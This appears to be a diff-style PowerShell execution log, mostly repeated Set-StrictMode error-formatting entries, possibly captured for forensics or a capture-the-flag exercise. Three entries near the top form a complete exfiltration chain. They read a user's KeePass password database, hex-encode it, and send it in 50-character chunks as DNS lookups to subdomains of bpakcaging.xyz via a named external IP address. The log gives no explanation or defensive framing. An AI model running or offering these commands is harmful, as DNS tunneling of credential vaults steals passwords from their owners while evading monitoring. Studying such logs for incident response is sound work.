+---
+[2023-01-13 17:32:42.977607Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:42.976461Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:42.975158Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:42.970529Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:42.623076Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:42.621936Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:42.620593Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:42.615658Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:41.672535Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:41.670611Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:41.665247Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:41.660940Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:41.384043Z] $split = $hex -split '(\S{50})'; ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" $destination;} echo "Done";;pwd
+---
+[2023-01-13 17:32:24.974197Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:24.973118Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:24.971950Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:24.967065Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:23.702462Z] $hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd
+---
+[2023-01-13 17:32:15.530207Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:15.529008Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:15.527702Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:15.522888Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:15.105474Z] $file='C:\Users\j.westcott\Documents\protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd
+---
+[2023-01-13 17:31:57.140788Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:31:57.139494Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:31:57.137974Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:31:57.132384Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:14.411943Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:14.410914Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:14.409749Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:14.404759Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:13.410280Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:13.409232Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:13.408101Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:13.403535Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:13.061967Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:13.060661Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:13.059281Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:13.054331Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:12.184404Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:12.183346Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:12.182166Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:12.177503Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:11.821888Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:11.820879Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:11.819723Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:11.815319Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:10.898700Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:10.897637Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:10.896455Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:10.890347Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:10.540804Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:10.539799Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:10.538652Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:10.534239Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:09.667849Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:09.666667Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:09.594049Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:09.589358Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:09.154930Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:09.153902Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:09.152746Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:09.148248Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:08.240130Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:08.238990Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:08.220852Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:08.215064Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:04.796589Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:04.795496Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:04.794238Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:04.764728Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:03.680243Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:03.679068Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:03.677705Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:03.672752Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:03.364404Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:03.363333Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:03.362109Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:03.356565Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:02.489802Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:02.488792Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:02.487651Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:02.483182Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:02.182683Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:02.181596Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:02.180416Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:02.170472Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:01.208961Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:01.207900Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:01.206736Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:01.201581Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:00.831374Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:00.830296Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:00.828931Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:00.824232Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:59.824721Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:59.823633Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:59.822427Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:59.818042Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:59.342083Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:59.341080Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:59.339941Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:59.335305Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:58.384444Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:58.383313Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:58.381496Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:58.376843Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:58.053367Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:58.052305Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:58.051141Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:58.045785Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:56.972319Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:56.971139Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:56.969Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:56.963950Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:56.308814Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:56.307761Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:56.306627Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:56.301990Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:55.351649Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:55.350599Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:55.349441Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:55.344837Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:54.998632Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:54.997471Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:54.996130Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:54.991368Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:54.119184Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:54.118124Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:54.116980Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:32:54.112461Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:32:53.754523Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:32:53.753489Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:32:53.752315Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:31.802688Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:31.782432Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:31.777518Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:31.450417Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:31.437764Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:31.436580Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:31.432027Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:30.548248Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:30.547096Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:30.545760Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:30.540939Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:30.232703Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:30.231621Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:30.230464Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:30.225955Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:29.320276Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:29.319236Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:29.318052Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:29.313073Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:28.955978Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:28.954793Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:28.953450Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:28.948602Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:27.696331Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:27.695313Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:27.694179Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:27.689726Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:27.380850Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:27.379790Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:27.378612Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:27.373106Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:26.449528Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:26.448515Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:26.447295Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:26.442679Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:26.105126Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:26.104084Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:26.102876Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:26.098363Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:25.228814Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:25.227736Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:25.226510Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:25.221858Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:24.864115Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:24.863054Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:24.858989Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:24.854577Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:23.905341Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:23.904279Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:23.903108Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:23.898378Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:23.509632Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:23.508557Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:23.507364Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:23.502804Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:22.584903Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:22.583873Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:22.582645Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:22.576858Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:22.215056Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:22.213995Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:22.212819Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:22.208031Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:21.288768Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:21.287694Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:21.286391Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:21.281522Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:20.950037Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:20.948983Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:20.947832Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:20.943211Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:20.043121Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:20.042055Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:20.040888Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:20.035809Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:19.658802Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:19.656759Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:19.655616Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:19.651182Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:18.763644Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:18.762564Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:18.761423Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:18.756533Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:18.402812Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:18.401750Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:18.400585Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:18.395960Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:17.465488Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:17.454686Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:17.453334Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:17.448551Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:17.073060Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:17.071992Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:17.070772Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:17.058133Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:16.159020Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:16.156423Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:16.155272Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:16.150593Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:15.719163Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:15.718Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:15.716641Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:15.711226Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:14.830296Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:14.829093Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:14.827947Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:14.822914Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:49.293728Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:49.288623Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:48.384129Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:48.382876Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:48.381557Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:48.377081Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:48.046018Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:48.044955Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:48.043794Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:48.039231Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:47.141443Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:47.140380Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:47.139247Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:47.134736Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:46.748080Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:46.747084Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:46.745967Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:46.741614Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:45.877393Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:45.875595Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:45.874434Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:45.869687Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:45.485789Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:45.484728Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:45.483524Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:45.478934Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:44.562825Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:44.561774Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:44.560630Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:44.556113Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:44.173407Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:44.172209Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:44.170775Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:44.166082Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:43.307926Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:43.306858Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:43.305697Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:43.300879Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:42.897388Z] { Set-StrictMode -Version 1; $_.OriginInfo }
